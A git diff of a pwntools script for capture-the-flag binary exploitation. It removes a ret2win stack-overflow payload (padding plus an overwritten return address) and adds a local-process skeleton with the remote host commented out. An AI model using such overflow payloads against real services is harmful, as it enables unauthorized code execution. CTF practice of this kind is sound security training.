@@ -1,19 +1,19 @@
 from pwn import * 
 from pwn import p64
 import socket
+from ctypes import *
+context(arch='amd64',os = 'linux', log_level='DEBUG')
 
-host = 'node4.buuoj.cn'
-ip = socket.gethostbyname(host)
-r = remote(ip,26150)#远程连接
+# host = "node.yuzhian.com.cn"
+# ip = socket.gethostbyname(host)
+# r = remote(ip,37506)#远程连接
+# elf = cdll.LoadLibrary('libc.so.6')
+r = process("./pwn")
 
-from pwn import * 
-from pwn import p64
-import socket
+elf = ELF('./pwn')
 
-context(arch='amd64')
-context.terminal = ['tmux', 'splitw', '-h']
-r = process("./ret2win")
-payload = b'A'*0x20 + b"junkjunk" + p64(0x00400756)
-r.sendlineafter(b">",payload)
+pause()
+
+# r.send()
+
 r.interactive()
-
